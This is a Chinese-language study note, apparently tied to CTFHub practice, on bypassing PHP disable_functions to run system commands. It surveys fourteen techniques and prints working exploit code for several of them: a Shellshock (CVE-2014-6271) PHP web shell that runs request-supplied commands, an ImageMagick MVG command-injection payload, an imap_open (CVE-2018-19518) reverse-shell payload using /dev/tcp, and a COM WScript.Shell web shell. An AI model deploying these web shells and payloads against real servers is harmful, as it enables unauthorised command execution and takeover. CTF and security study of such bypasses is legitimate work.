# php bypass  disable_functions

>最近学习了一些pwn的知识，于是发现之前这个知识点都没有怎么认真了解，正好ctfhub上有这个类型的题，于是用一下午来学习学习。

## 1.黑名单绕过

众所周知，disable_functions 是基于黑名单来实现对某些函数使用的限制的，既然是黑名单有时候就难免会有漏网之鱼

PHP 中能直接执行系统程序的函数

```php
system()
shell_exec(）
exec()
passthru()
popen()
proc_open()
pcntl_exec()
dl() // 加载自定义 php 扩展
```

PHP 中执行运算符（反引号）的效果和 shell_exec() 是相同的

## 2. LD_PRELOAD

>https://mp.weixin.qq.com/s/GGnumPklkUNMLZKQL4NbKg
>
>https://xz.aliyun.com/t/4623#toc-0

`LD_PRELOAD` 是一个 Unix 中比较特殊的环境变量，也产生过很多安全问题

简介

>  LD_PRELOAD 是一个可选的 Unix 环境变量，包含一个或多个共享库或共享库的路径，加载程序将在包含 C 运行时库（libc.so）的任何其他共享库之前加载该路径。这称为预加载库。
>
>  也就是说它可以影响程序的运行时的链接（Runtime linker），它允许你定义在程序运行前优先加载的动态链接库。即我们可以自己生成一个动态链接库加载，以覆盖正常的函数库，也可以注入恶意程序，执行恶意命令。

LD_PRELOAD 绕过 disable_functions 的原理就是劫持系统函数，使程序加载恶意动态链接库文件，从而执行系统命令等敏感操作

## 3. PHP 5.x Shellshock 

>https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/2

PHP < 5.6.2 – ‘Shellshock’ Safe Mode / Disable Functions Bypass / Command Injection

exp

```php
# Exploit Title: PHP 5.x Shellshock Exploit (bypass disable_functions)
# Google Dork: none
# Date: 10/31/2014
# Exploit Author: Ryan King (Starfall)
# Vendor Homepage: http://php.net
# Software Link: http://php.net/get/php-5.6.2.tar.bz2/from/a/mirror
# Version: 5.* (tested on 5.6.2)
# Tested on: Debian 7 and CentOS 5 and 6
# CVE: CVE-2014-6271
<pre>
<?php echo "Disabled functions: ".ini_get('disable_functions')."n"; ?>
<?php
function shellshock($cmd) { // Execute a command via CVE-2014-6271 @ mail.c:283
   if(strstr(readlink("/bin/sh"), "bash") != FALSE) {
     $tmp = tempnam(".","data");
     putenv("PHP_LOL=() { x; }; $cmd >$tmp 2>&1");
     // In Safe Mode, the user may only alter environment variables whose names
     // begin with the prefixes supplied by this directive.
     // By default, users will only be able to set environment variables that
     // begin with PHP_ (e.g. PHP_FOO=BAR). Note: if this directive is empty,
     // PHP will let the user modify ANY environment variable!
     mail("a@127.0.0.1","","","","-bv"); // -bv so we don't actually send any mail
   }
   else return "Not vuln (not bash)";
   $output = @file_get_contents($tmp);
   @unlink($tmp);
   if($output != "") return $output;
   else return "No output, or not vuln.";
}
echo shellshock($_REQUEST["cmd"]);
?>
```

## 4. Apache mod_cgi 

>https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/3

有几个利用条件

1. Apache 开启 AllowOverride
2. 开启 cgi_module
3. .htaccess 文件可写
4. cgi 程序可执行

简单的说就是使用配置文件.htaccess去进行cgi文件，然后我们上传我们的cgi文件进行命令执行。

## 5. PHP-FPM/FastCGI

https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/4

p师傅写过一个脚本

https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75

在ssrf漏洞中也经常使用

## 6. ImageMagick

利用 ImageMagick 命令执行漏洞（CVE-2016–3714）

```php
<?php
echo "Disable Functions: " . ini_get('disable_functions') . "n";

function AAAA(){
$command = 'curl 127.0.0.1:7777';

$exploit = <<<EOF
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|$command")'
pop graphic-context
EOF;

file_put_contents("KKKK.mvg", $exploit);
$thumb = new Imagick();
$thumb->readImage('KKKK.mvg');
$thumb->writeImage('KKKK.png');
$thumb->clear();
$thumb->destroy();
unlink("KKKK.mvg");
unlink("KKKK.png");
}
AAAA();
?>
```

复现环境 https://github.com/Medicean/VulApps/tree/master/i/imagemagick/1

## 7.PHP7 GC with Certain Destructors UAF

>https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/7
>
>https://github.com/mm0r1/exploits/tree/master/php7-gc-bypass

UAF利用

## 8. json Serializer UAF

>https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/6

注意 PHP 版本需要满足:

- 7.1 - all versions to date
- 7.2 < 7.2.19 (released: 30 May 2019)
- 7.3 < 7.3.6 (released: 30 May 2019)

https://bugs.php.net/bug.php?id=77843

## 9. PHP7 GC with Certain Destructors UAF

>https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/7

- Linux 操作系统
- PHP 版本
  - 7.0 - all versions to date
  - 7.1 - all versions to date
  - 7.2 - all versions to date
  - 7.3 - all versions to date

https://bugs.php.net/bug.php?id=72530

## 10. PHP imap_open RCE 漏洞 （CVE-2018-19518）

要求 PHP 安装 imap 模块

反弹 shell payload：

```php
<?php
$payload = "/bin/bash -i >& /dev/tcp/ip/port 0>&1";
$base64 = base64_encode($payload);
$server = "any -oProxyCommand=echot{$base64}|base64t-d|bash";
@imap_open("{".$server."}:143/imap}INBOX","","");
```

## 11. 利用 FFI 扩展

> https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/8

- Linux 操作系统
- PHP >= 7.4
- 开启了 FFI 扩展且 ffi.enable=true

PHP7.4 的一个新特性 FFI（Foreign Function Interface），即外部函数接口，可以让我们在 PHP 中调用 C 代码

## 12. Windows 系统组件 COM

 COM（Component Object Model）组件对象模型，是一种跨应用和语言共享二进制代码的方法。COM 可以作为 DLL 被本机程序载入也可以通过 DCOM 被远程进程调用

`C:WindowsSystem32` 下的 wshom.ocx 能够提供 WshShell 对象和 WshNetwork 对象接口的访问，也就是提供对本地 Windows shell 和计算机所连接的网络上共享资源的访问

php.ini 中开启 `com.allow_dcom`

```
com.allow_dcom = true
```

因为是在 Windows，如果在拓展文件夹 php/ext/ 中存在 php_com_dotnet.dll

到 php.ini 中开启拓展

```
extension=php_com_dotnet.dll
```

```php
<?php
$command = $_GET['cmd'];
$wsh = new COM('WScript.shell') or die("Create Wscript.Shell Failed!");
$exec = $wsh->exec("cmd /c".$command); //调用对象方法来执行命令
$stdout = $exec->StdOut();
$stroutput = $stdout->ReadAll();
echo $stroutput;
?>
```

## 13. PHP 5.2.3 win32std extension safe_mode 

exploit-db 上的 exp

```php
<?php
//PHP 5.2.3 win32std extension safe_mode and disable_functions protections bypass

//author: shinnai
//mail: shinnai[at]autistici[dot]org
//site: http://shinnai.altervista.org

//Tested on xp Pro sp2 full patched, worked both from the cli and on apache

//Thanks to rgod for all his precious advises :)

//I set php.ini in this way:
//safe_mode = On
//disable_functions = system
//if you launch the exploit from the cli, cmd.exe will be wxecuted
//if you browse it through apache, you'll see a new cmd.exe process activated in taskmanager

if (!extension_loaded("win32std")) die("win32std extension required!");
system("cmd.exe"); //just to be sure that protections work well
win_shell_execute("..\..\..\..\windows\system32\cmd.exe");
?>
```

## 14. PHP SplDoublyLinkedList中的用后释放漏洞分析

>https://www.freebuf.com/articles/web/251017.html

## 参考

>https://www.anquanke.com/post/id/197745
>
>https://github.com/AntSwordProject/AntSword-Labs
